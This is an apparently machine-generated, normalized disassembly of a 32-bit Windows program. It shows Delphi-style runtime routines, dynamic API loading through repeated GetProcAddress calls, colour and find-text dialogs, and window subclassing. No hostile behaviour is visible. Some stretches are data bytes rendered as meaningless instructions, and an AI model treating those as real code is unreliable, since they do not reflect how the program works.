add [ eax ] dl
push esp
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
mov eax esi
call sub_403380
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_4304b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4304f4
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_43054c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430571
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430578
retn
sub_430584
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_43053c
xor eax eax
push ebp
push sub_43073b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430742
mov eax [ rw-data ]
call sub_430544
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_430744
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_43053c
xor eax eax
push ebp
push sub_430af7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430afe
mov eax [ rw-data ]
call sub_430544
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_430ea8
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_430ed0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430f18
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f1f
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403390
call sub_430584
cmp [ rw-data ] 0x0
jg r-xdata
sub_430f40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430f65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f6c
retn
sub_430f78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430f9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430fa4
retn
sub_430fb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430fd5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430fdc
retn
sub_430fe8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43100d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431014
retn
sub_431020
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431045
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43104c
retn
sub_431058
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43107d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431084
retn
sub_431090
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4310b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4310bc
retn
sub_4310e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431105
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43110c
retn
sub_431118
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43113d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431144
retn
sub_4317cc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4645ec
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_460b8c
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_460b8c
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_4642f0
mov edi eax
mov eax ebx
call sub_4642d4
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_4642bc
mov edi eax
mov eax ebx
call sub_464308
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_431880
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_4317cc
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_4318e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov [ esi + 0x30 ] 0x1
push esi
push sub_4319c4
call sub_424b38
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_431930
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
call sub_424bd0
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_431964
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_467088
mov cl 0x1
sub_43198c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4035e0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4319c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4319ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431a5c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45d9d8
mov [ ebp - 0x14 ] eax
call sub_45d8f4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_431b1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466978
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_431af1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431af8
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4669d4
retn
sub_431af8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b26
mov eax [ ebp - 0x14 ]
call sub_45da8c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45d8fc
retn
sub_431b58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4318e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x60 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_431b9c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x60 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431930
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_431bcc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_431c69
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_4092d8
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx esi
add dl 0x41
call sub_404308
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40442c
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
pop ecx
call sub_41d3e0
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c70
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_431c98
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_431d36
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x44 ]
mov [ ebx ] 0xffffffff
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_40442c
mov eax [ ebp - 0x10 ]
call sub_4086fc
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx esi
add dl 0x41
call sub_404308
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40442c
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_41ccf8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d3d
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404144
retn
inc esi
add ebx 0x4
cmp esi 0x10
jne r-xdata
sub_431d57
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_431c98
pop ecx
mov [ ebp - 0x68 ] 0x24
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42697c
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] 0x11
xor eax eax
mov edx rw-data
jae r-xdata
and ebx 0x7f
bt [ ecx + 0x5c ] ebx
inc eax
add edx 0x4
cmp al 0x5
jne r-xdata
mov ecx [ edx ]
or [ ebp - 0x54 ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx eax
cmp bl 0x7
ja r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x4c ] sub_431880
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx ChooseColorA
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
or [ ebp - 0x54 ] 0x20
mov [ ebp - 0x48 ] eax
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x5c ]
mov [ eax + 0x58 ] edx
push ebp
call sub_431bcc
pop ecx
sub_431e2a
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] bh
inc ebx
add [ edi + ebx + 0x43 ] al
add [ eax ] dl
add al [ eax ]
add [ ebx + esi + 0x44 ] ch
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov esp 0xbc004495
loop r-xdata
add [ ebp + edx * 8 + 0x44 ] cl
add [ edx + ebp * 4 - 0x43afffbc ] ch
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax - 0x2fffbb6c ] bl
fld [ eax + eax - 0x14 ]
loop r-xdata
add [ eax - 0x4b ] dl
inc esp
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ ecx ] al
add [ ecx ] ah
mov al 0xe4
pop ds
inc ebx
add [ ecx ] dl
push esp
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
pop esp
pop ds
inc ebx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0x1e74776f
inc ebx
add [ eax ] ah
aaa
inc esp
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a5f8
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
add [ eax - 0x3fffbce1 ] ch
xchg edx eax
inc esp
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ edi + ebx - 0x570bffbd ] al
inc esp
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
sub_431fa8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44b180
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_431fec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_432028
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467de4
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_431fec
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_467e08
jmp r-xdata
push ebp
call sub_431fec
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467de4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467de4
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_467e08
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_467e08
jmp r-xdata
sub_4320dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_431880
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_43239c
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_432404
push eax
mov eax esi
call sub_43239c
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_432404
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_432028
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_432164
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4318e8
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_4320dc
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_43220e
add [ eax ] al
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d7a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431930
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_432264
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_443e64
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0xc ]
